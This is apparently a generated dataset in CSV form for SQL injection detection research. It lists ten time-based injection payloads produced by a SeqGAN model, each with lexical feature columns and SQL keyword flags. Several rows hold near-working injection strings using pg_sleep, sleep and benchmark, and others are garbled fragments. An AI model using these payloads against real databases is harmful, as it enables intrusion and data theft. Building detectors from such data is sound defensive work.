label,payload,family,payload_type,method,run_id,sample_index,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,keyword_total
attack,"1""  )   ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,0,8.0,4.0,1.5487949406953985,0.0,1.0,5.0,2.0,0.0,0.125,0.625,0.25,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  """" like ""aia",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1,90.0,28.0,3.572298907232804,29.0,10.0,39.0,12.0,0.32222222222222224,0.1111111111111111,0.43333333333333335,0.13333333333333333,0.0,4.0,0.0,0.0,0.0,1.0,0.0,6.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,select sleep  (  5  )   and 6969  )   en  4287 where 2679  'isintegratedsecurityonly' sleep  (  5   )    )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,2,109.0,29.0,3.9079454207065796,50.0,14.0,36.0,9.0,0.45871559633027525,0.12844036697247707,0.3302752293577982,0.08256880733944955,2.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack,",   (    gclj",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,3,13.0,7.0,2.1887870678023824,4.0,0.0,7.0,2.0,0.3076923076923077,0.0,0.5384615384615384,0.15384615384615385,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,   )    )    aase 6793bmsevl'  =  'evl,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,4,38.0,15.0,3.1227988949655994,13.0,4.0,16.0,5.0,0.34210526315789475,0.10526315789473684,0.42105263157894735,0.13157894736842105,2.0,0.0,0.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,1%'   )    )   asbgf,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,5,20.0,10.0,2.5609640474436812,5.0,1.0,10.0,4.0,0.25,0.05,0.5,0.2,1.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1'   )    )    and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (   '""  =  ""lcjea'  =  'araro",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,6,118.0,26.0,3.2897729284910424,33.0,10.0,57.0,18.0,0.2796610169491525,0.0847457627118644,0.4830508474576271,0.15254237288135594,4.0,2.0,0.0,0.0,0.0,3.0,0.0,8.0,0.0,1.0,0.0,3.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,1%'   )    )    or sleep  (  0x6d457153   )    )    )   4240 ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,7,61.0,21.0,3.0136125244711907,9.0,13.0,31.0,8.0,0.14754098360655737,0.21311475409836064,0.5081967213114754,0.13114754098360656,1.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,select benchmark  (    =  )   else dfond,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,8,40.0,19.0,3.5790441746305874,24.0,0.0,13.0,3.0,0.6,0.0,0.325,0.075,0.0,0.0,0.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,1   )    )    or sleep  (  5  )   and sleep  (  5  )   srlt  (  5   )    )     )   elseretd,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,9,91.0,15.0,2.57636122367086,27.0,4.0,50.0,10.0,0.2967032967032967,0.04395604395604396,0.5494505494505495,0.10989010989010989,0.0,0.0,0.0,0.0,0.0,0.0,0.0,10.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
